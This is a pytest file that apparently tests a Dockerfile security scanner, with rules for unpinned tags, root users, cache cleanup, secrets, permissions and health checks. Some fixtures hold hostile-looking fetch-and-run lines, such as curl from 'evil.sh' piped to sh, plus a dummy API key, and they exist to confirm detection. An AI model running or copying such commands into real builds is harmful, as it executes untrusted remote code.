from __future__ import annotations

from textwrap import dedent

from prithvi import Scanner, Severity


def _scan(src: str):
    return Scanner().scan(dedent(src).strip())


def test_flags_latest_tag() -> None:
    findings = _scan("FROM python:latest\nUSER app")
    assert any(f.rule_id == "PR001" for f in findings)


def test_flags_untagged_image() -> None:
    findings = _scan("FROM python\nUSER app")
    assert any(f.rule_id == "PR001" for f in findings)


def test_pinned_digest_is_fine_for_pr001() -> None:
    findings = _scan("FROM python@sha256:abcd1234\nUSER app")
    assert not any(f.rule_id == "PR001" for f in findings)


def test_flags_root_user() -> None:
    findings = _scan("FROM python:3.12\nRUN echo hi")
    assert any(f.rule_id == "PR002" for f in findings)


def test_accepts_explicit_non_root_user() -> None:
    findings = _scan("FROM python:3.12\nRUN adduser -D app\nUSER app")
    assert not any(f.rule_id == "PR002" for f in findings)


def test_flags_apt_without_cache_cleanup() -> None:
    src = "FROM debian:12\nRUN apt-get update && apt-get install -y curl\nUSER app"
    findings = _scan(src)
    assert any(f.rule_id == "PR003" for f in findings)


def test_apt_with_cache_cleanup_is_fine() -> None:
    src = (
        "FROM debian:12\n"
        "RUN apt-get update && apt-get install -y curl && rm -rf /var/lib/apt/lists/*\n"
        "USER app"
    )
    findings = _scan(src)
    assert not any(f.rule_id == "PR003" for f in findings)


def test_flags_apk_without_no_cache() -> None:
    findings = _scan("FROM alpine:3.19\nRUN apk add curl\nUSER app")
    assert any(f.rule_id == "PR003" for f in findings)


def test_flags_curl_piped_to_shell() -> None:
    findings = _scan('FROM alpine:3.19\nRUN curl -fsSL https://evil.sh | sh\nUSER app')
    assert any(f.rule_id == "PR004" and f.severity == Severity.HIGH for f in findings)


def test_flags_add_http_url() -> None:
    findings = _scan("FROM alpine:3.19\nADD https://example.com/thing /thing\nUSER app")
    assert any(f.rule_id == "PR005" for f in findings)


def test_flags_add_for_local_file() -> None:
    findings = _scan("FROM alpine:3.19\nADD ./app /app\nUSER app")
    assert any(f.rule_id == "PR005" for f in findings)


def test_flags_hardcoded_env_secret() -> None:
    findings = _scan("FROM alpine:3.19\nENV API_KEY=sk-1234567890abcdef\nUSER app")
    assert any(f.rule_id == "PR006" and f.severity == Severity.CRITICAL for f in findings)


def test_flags_sudo_in_run() -> None:
    findings = _scan("FROM alpine:3.19\nRUN sudo apk add --no-cache curl\nUSER app")
    assert any(f.rule_id == "PR007" for f in findings)


def test_line_continuations_preserve_line_number() -> None:
    src = (
        "FROM alpine:3.19\n"
        "RUN apk add --no-cache \\\n"
        "    curl \\\n"
        "    && rm -rf /tmp/*\n"
        "USER app"
    )
    findings = _scan(src)
    # All instructions parsed; no spurious findings except maybe PR002 absence.
    rule_ids = {f.rule_id for f in findings}
    assert "PR001" not in rule_ids  # tagged
    assert "PR002" not in rule_ids  # user set


def test_findings_are_sorted_by_severity_then_line() -> None:
    src = (
        "FROM python:latest\n"       # PR001 medium
        "RUN curl http://x | sh\n"   # PR004 high
        "RUN apk add curl\n"          # PR003 low (and PR002 high if no USER)
    )
    findings = _scan(src)
    # Critical/High must come before Medium/Low.
    severities = [f.severity for f in findings]
    assert severities == sorted(severities, key=lambda s: ["critical", "high", "medium", "low", "info"].index(s.value))


# New rules: PR008–PR012
# --------------------------------------------------------------------------


def test_flags_relative_workdir() -> None:
    findings = _scan("FROM alpine:3.19\nWORKDIR app\nUSER app")
    assert any(f.rule_id == "PR008" for f in findings)


def test_absolute_workdir_is_fine() -> None:
    findings = _scan("FROM alpine:3.19\nWORKDIR /app\nUSER app")
    assert not any(f.rule_id == "PR008" for f in findings)


def test_flags_chmod_777() -> None:
    findings = _scan('FROM alpine:3.19\nRUN chmod -R 777 /opt\nUSER app')
    assert any(f.rule_id == "PR009" and f.severity == Severity.HIGH for f in findings)


def test_flags_chmod_a_rwx() -> None:
    findings = _scan('FROM alpine:3.19\nRUN chmod a+rwx /opt\nUSER app')
    assert any(f.rule_id == "PR009" for f in findings)


def test_missing_healthcheck_when_exposed() -> None:
    src = "FROM alpine:3.19\nEXPOSE 8080\nCMD [\"./serve\"]\nUSER app"
    findings = _scan(src)
    assert any(f.rule_id == "PR010" for f in findings)


def test_no_healthcheck_warning_when_present() -> None:
    src = (
        "FROM alpine:3.19\n"
        "EXPOSE 8080\n"
        'HEALTHCHECK CMD wget -qO- http://localhost:8080/health || exit 1\n'
        "USER app\n"
        "CMD [\"./serve\"]"
    )
    findings = _scan(src)
    assert not any(f.rule_id == "PR010" for f in findings)


def test_flags_apt_install_without_y() -> None:
    src = "FROM debian:12\nRUN apt-get update && apt-get install curl && rm -rf /var/lib/apt/lists/*\nUSER app"
    findings = _scan(src)
    assert any(f.rule_id == "PR011" for f in findings)


def test_apt_install_with_y_is_fine() -> None:
    src = "FROM debian:12\nRUN apt-get install -y curl && rm -rf /var/lib/apt/lists/*\nUSER app"
    findings = _scan(src)
    assert not any(f.rule_id == "PR011" for f in findings)


def test_flags_pip_install_without_no_cache_dir() -> None:
    src = "FROM python:3.12\nRUN pip install requests\nUSER app"
    findings = _scan(src)
    assert any(f.rule_id == "PR012" for f in findings)


def test_pip_install_with_no_cache_dir_is_fine() -> None:
    src = "FROM python:3.12\nRUN pip install --no-cache-dir requests\nUSER app"
    findings = _scan(src)
    assert not any(f.rule_id == "PR012" for f in findings)
